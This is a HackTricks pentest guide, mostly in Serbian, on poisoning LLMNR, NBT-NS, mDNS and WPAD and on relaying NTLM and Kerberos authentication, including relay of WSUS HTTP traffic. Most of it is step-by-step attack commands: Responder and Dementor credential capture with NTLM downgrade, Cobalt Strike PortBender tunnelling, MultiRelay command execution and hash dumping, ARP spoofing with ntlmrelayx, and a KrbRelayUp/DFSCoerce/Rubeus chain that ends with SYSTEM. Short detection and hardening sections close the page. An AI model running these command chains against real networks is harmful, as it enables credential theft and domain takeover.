# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Mrežni protokoli

### Protokoli za lokalno rešavanje imena hostova

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i drugi operativni sistemi koriste LLMNR i NBT-NS za lokalno rešavanje imena kada DNS zakaže. Slično tome, Apple i Linux sistemi koriste mDNS.
- Ovi protokoli su podložni presretanju i spoofingu zbog njihovog neautentifikovanog, broadcast karaktera preko UDP-a.
- [Responder](https://github.com/lgandx/Responder) and [Dementor](https://github.com/MatrixEditor/Dementor) mogu se koristiti za lažno predstavljanje servisa slanjem falsifikovanih odgovora hostovima koji postavljaju upite ovim protokolima.
- Further information on service impersonation using Responder can be found [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD omogućava preglednicima da automatski otkriju podešavanja proxy-ja.
- Otkrivanje se olakšava preko DHCP-a, DNS-a, ili preusmeravanjem na LLMNR i NBT-NS ako DNS zakaže.
- Responder može automatizovati WPAD napade, usmeravajući klijente na zlonamerne WPAD servere.

### Responder/Dementor for Protocol Poisoning

- **Responder** je alat koji se koristi za trovanje upita LLMNR, NBT-NS i mDNS, selektivno odgovarajući na osnovu tipa upita, prvenstveno ciljajući SMB servise.
- Dolazi predinstaliran u Kali Linux, konfiguriše se u `/etc/responder/Responder.conf`.
- Responder prikazuje uhvaćene heševe na ekranu i čuva ih u direktorijumu `/usr/share/responder/logs`.
- Podržava i IPv4 i IPv6.
- Windows verzija Responder je dostupna [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** proširuje temu multicast trovanja i dodatno deluje kao rogue service provider (uključujući CUPS RCE support)
- Opšta struktura je slična **Responder** uz detaljniju konfiguraciju. (default je ovde: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Compatibility between **Dementor** and **Responder** is given here: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro and Documentation here: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Ispravlja probleme sa hvatanjem koje je Responder uvodio na određenim protokolima

#### Pokretanje Responder

- Za pokretanje Responder sa podrazumevanim podešavanjima: `responder -I <Interface>`
- Za agresivnije sondiranje (uz potencijalne neželjene efekte): `responder -I <Interface> -P -r -v`
- Tehnike za hvatanje NTLMv1 challenges/responses radi lakšeg cracking-a: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation može se aktivirati sa: `responder -I <Interface> --wpad`
- NetBIOS zahtevi se mogu usmeriti na IP napadača, i može se podesiti authentication proxy: `responder.py -I <interface> -Pv`

#### Pokretanje Dementor

- With detault settings applied: `Dementor -I <interface>`
- Sa podrazumevanim podešavanjima u analitičkom režimu: `Dementor -I <interface> -A`
- Automatic NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Pokreni trenutnu sesiju sa prilagođenom konfiguracijom: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing DHCP responses može trajno kompromitovati informacije o rutiranju žrtve, nudeći prikriveniju alternativu ARP poisoning.
- Zahteva precizno znanje o konfiguraciji ciljane mreže.
- Pokretanje napada: `./Responder.py -I eth0 -Pdv`
- Ova metoda može efikasno uhvatiti NTLMv1/2 heševe, ali zahteva pažljivo postupanje da bi se izbegla ometanja na mreži.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor će lažno predstavljati servise koristeći gore pomenute protokole, hvatajući kredencijale (obično NTLMv2 Challenge/Response) kada korisnik pokuša da se autentifikuje protiv spoofed servisa.
- Mogući su pokušaji da se downgrade-uje na NetNTLMv1 ili da se isključi ESS radi lakšeg crack-ovanja kredencijala.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Ključno je napomenuti da upotreba ovih tehnika treba da se vrši legalno i etički, uz odgovarajuću autorizaciju i izbegavanje ometanja ili neovlašćenog pristupa.

## Inveigh

Inveigh je alat za penetration testers i red teamers, dizajniran za Windows sisteme. Nudi funkcionalnosti slične Responder, izvodeći spoofing i man-in-the-middle napade. Alat se razvio iz PowerShell skripte u C# binarni fajl, sa [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kao glavnim verzijama. Detaljni parametri i instrukcije se mogu naći u [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh se može pokretati preko PowerShell-a:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ili izvršeno kao C# binarni fajl:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Ovaj napad koristi SMB autentifikacione sesije za pristup ciljnom računaru, dodeljujući system shell ako uspe. Ključni preduslovi uključuju:

- Korisnik koji se autentifikuje mora imati Local Admin pristup na relayed hostu.
- SMB signing treba biti onemogućen.

#### 445 Port Forwarding and Tunneling

U scenarijima gde direktan ulazak u mrežu nije izvodljiv, saobraćaj sa porta 445 mora biti preusmeren i tunelovan. Alati poput [**PortBender**](https://github.com/praetorian-inc/PortBender) pomažu pri preusmeravanju saobraćaja sa porta 445 na drugi port, što je neophodno kada postoji Local Admin pristup za učitavanje drajvera.

Podešavanje i rad PortBender-a u Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Ostali alati za NTLM Relay Attack

- **Metasploit**: Podešava se sa proxies, detaljima lokalnog i udaljenog hosta.
- **smbrelayx**: Python skripta za relaying SMB sesija, izvršavanje komandi ili deploy backdoors.
- **MultiRelay**: alat iz Responder suite koji omogućava relay specific users ili sve korisnike, izvršavanje komandi ili dump hashes.

Svaki alat se može konfigurisati da radi preko SOCKS proxy-a po potrebi, omogućavajući napade čak i pri indirektnom mrežnom pristupu.

### MultiRelay Operacija

MultiRelay se pokreće iz direktorijuma _**/usr/share/responder/tools**_, ciljajući specifične IP adrese ili korisnike.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ovi alati i tehnike čine sveobuhvatan skup za izvođenje NTLM Relay napada u raznim mrežnim okruženjima.

### Zloupotreba WSUS HTTP (8530) za NTLM Relay prema LDAP/SMB/AD CS (ESC8)

WSUS klijenti se autentifikuju na svoj update server koristeći NTLM preko HTTP (8530) ili HTTPS (8531). Kada je HTTP omogućen, periodične provere klijenata se mogu prisiliti ili presresti na lokalnom segmentu i relaye-ovati pomoću ntlmrelayx ka LDAP/LDAPS/SMB ili AD CS HTTP endpoint-ima (ESC8) bez crack-ovanja bilo kakvih heševa. Ovo se uklapa u normalan update saobraćaj i često dovodi do autentifikacija mašinskih naloga (HOST$).

Šta tražiti
- GPO/registry konfiguracija pod HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate i ...\WindowsUpdate\AU:
- WUServer (npr. http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled i DetectionFrequency (sati)
- WSUS SOAP endpoint-i koje koriste klijenti preko HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Podrazumevani portovi: 8530/tcp HTTP, 8531/tcp HTTPS

Prikupljanje informacija
- Neautentifikovano
- Scan za listener-e: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff-ovanje HTTP WSUS saobraćaja preko L2 MITM i beleženje aktivnih klijenata/endpoint-a sa wsusniff.py (samo HTTP osim ako ne uspete da natjerate klijente da veruju vašem TLS certu).
- Autentifikovano
- Parsiranje SYSVOL GPOs za WSUS ključeve pomoću MANSPIDER + regpol (wsuspider.sh wrapper sumira WUServer/WUStatusServer/UseWUServer).
- Upit endpoint-ima u skalama sa hostova (NetExec) ili lokalno:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Koraci za end-to-end HTTP relay
1) Pozicionirajte se za MITM (isti L2) tako da klijent rezolvuje WSUS server na vas (ARP/DNS poisoning, Bettercap, mitm6, itd.). Primer sa arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Preusmerite port 8530 na vaš relay listener (opciono, praktično):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Pokrenite ntlmrelayx sa HTTP listener-om (zahteva Impacket podršku za HTTP listener; videti PR-ove ispod):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Ostali uobičajeni ciljevi:
- Relay ka SMB (ako je signing isključen) za exec/dump: -t smb://<host>
- Relay ka LDAPS za promene u direktorijumu (npr. RBCD): -t ldaps://<DC>
- Relay ka AD CS web enrollment (ESC8) da izdate sertifikat i potom se autentifikujete putem Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Za dublje puteve zloupotrebe AD CS i tooling, pogledajte AD CS stranicu:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Naterajte klijenta na check-in ili sačekajte raspored. Sa klijenta:
wuauclt.exe /detectnow
ili koristite Windows Update UI (Check for updates).

5) Koristite autentifikovane SOCKS sesije (ako je -socks) ili direktne rezultate relay-a za post-exploitation (LDAP izmene, SMB operacije ili izdavanje AD CS sertifikata za kasniju autentifikaciju).

Ograničenje za HTTPS (8531)
- Pasivno presretanje WSUS preko HTTPS-a nije efektivno osim ako klijenti ne veruju vašem sertifikatu. Bez poverljivog certifikata ili drugog TLS prekida, NTLM handshake se ne može uspeti harvest-ovati/relay-ovati iz WSUS HTTPS saobraćaja.

Napomene
- WSUS je najavljen kao deprecated ali ostaje široko raspoređen; HTTP (8530) je i dalje čest u mnogim okruženjima.
- Korisni pomoćnici: wsusniff.py (posmatranje HTTP WSUS check-in-ova), wsuspider.sh (enumeriše WUServer/WUStatusServer iz GPO-ova), NetExec reg-query na skali.
- Impacket je vratio HTTP listener podršku za ntlmrelayx u PR #2034 (originalno dodat u PR #913).

### Forsiranje NTLM prijava

U Windowsu **možda možete primorati neke privilegovane naloge da se autentifikuju na proizvoljnim mašinama**. Pročitajte sledeću stranicu da saznate kako:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** krade **AP-REQ ticket** od jedne usluge i ponovo ga koristi protiv druge usluge koja deli **isti ključ računala (computer-account key)** (jer su oba SPN-a na istom `$` machine account-u). Ovo funkcioniše iako se **service classes SPN-ova razlikuju** (npr. `CIFS/` → `LDAP/`) jer je *ključ* koji dekriptuje tiket NT hash mašine, a ne sam SPN string, i SPN string nije deo potpisa.

Za razliku od NTLM relay-a, skok je ograničen na *isti host*, ali ako ciljate protokol koji vam omogućava pisanje u LDAP, možete se povezati u **Resource-Based Constrained Delegation (RBCD)** ili **AD CS enrollment** i dobiti **NT AUTHORITY\SYSTEM** u jednom potezu.

Za detaljne informacije o ovom napadu pogledajte:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Dokazuje korisnika KDC-u | nepromenjeno |
| **Service ticket / TGS-REQ ↔ REP** | Povezan sa jednim **SPN**; enkriptovan ključem vlasnika SPN-a | zamenjiv ako SPN-ovi dele isti nalog |
| **AP-REQ** | Klijent šalje `TGS` usluzi | **ono što ukrademo i ponovo reprodukujemo** |

* Tiketi su enkriptovani sa **password-derived key naloga koji poseduje SPN**.
* **Authenticator** unutar AP-REQ ima timestamp od 5 minuta; replay unutar tog prozora važi dok servisni cache ne detektuje duplikat.
* Windows retko proverava da li SPN string u tiketu odgovara servisu koji napadate, pa tiket za `CIFS/HOST` obično dekriptuje bez problema na `LDAP/HOST`.

- 2. **Šta mora biti tačno da bi se relay-ovao Kerberos**

1. **Shared key:** izvorni i ciljni SPN-ovi pripadaju istom computer account-u (default na Windows serverima).
2. **Nema channel protection:** SMB/LDAP signing isključen i EPA isključen za HTTP/LDAPS.
3. **Možete presresti ili prisiliti autentifikaciju:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, itd.
4. **Izvor tiketa nije već upotrebljen:** pobeđujete u trci pre nego što stvarni paket stigne ili ga potpuno blokirajte; inače servisni replay cache generiše Event 4649.
5. Treba na neki način moći da izvodite **MitM u komunikaciji** — npr. biti deo DNSAmins grupe da menjate DNS domene ili moći izmeniti HOST fajl žrtve.

### Kerberos Relay Steps

- 3.1 **Prikupljanje informacija o hostu**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Pokrenite relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` obuhvata **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** u jednom binarnom fajlu.

- 3.3 **Primoravanje Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce natera DC da nam pošalje Kerberos `CIFS/DC01` tiket.

- 3.4 **Relay the AP-REQ**

KrbRelay izvlači GSS blob iz SMB-a, prepakira ga u LDAP bind i prosleđuje na `ldap://DC01`—autentikacija uspeva jer ga dešifruje **isti ključ**.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Sada posedujete **NT AUTHORITY\SYSTEM**.


### **Još putanja koje vredi znati**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Lažni server šalje **GSS-ID payload** sa bilo kojim SPN; klijent gradi AP-REQ direktno ka vama | Radi čak i preko subnet-a; mašinski kredencijali podrazumevano |
| **DCOM / MSRPC** | Zlonamerni OXID resolver prisiljava klijenta da se autentifikuje na proizvoljan SPN i port | Čist *local* priv-esc; zaobilazi firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Zaobilazi LDAP signing odbrane |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | Nema potrebe dodavati computer account |

### **Rešavanje problema**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ključ tiketa ≠ ključ mete | Pogrešan host/SPN |
| `KRB_AP_ERR_SKEW` | Sat > 5 min pomeraj | Sinhronizujte vreme ili koristite `w32tm` |
| LDAP bind fails | Signing enforced | Koristite AD CS path ili onemogućite signing |
| Event 4649 spam | Service saw duplicate Authenticator | blokirajte ili pokušajte preduhitriti originalni paket |


### **Detekcija**

* Nagli porast **Event 4769** za `CIFS/`, `HTTP/`, `LDAP/` sa istog izvora u roku od nekoliko sekundi.
* **Event 4649** na servisu ukazuje na otkriven replay.
* Kerberos logon sa **127.0.0.1** (relay ka lokalnom SCM) je veoma sumnjiv — mapirajte preko Sigma pravila u KrbRelayUp docs.
* Pratite promene u atributima `msDS-AllowedToActOnBehalfOfOtherIdentity` ili `msDS-KeyCredentialLink`.


## **Ojačavanje**

1. **Obavezno omogućite LDAP & SMB signing + EPA** na svakom serveru.
2. **Razdvojite SPN-ove** tako da HTTP ne bude na istom nalogu kao CIFS/LDAP.
3. Zakrpajte coercion vektore (PetitPotam KB5005413, DFS, AuthIP).
4. Podesite **`ms-DS-MachineAccountQuota = 0`** da zaustavite rogue computer joins.
5. Postavite alarm na **Event 4649** i neočekivane loopback Kerberos prijave.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
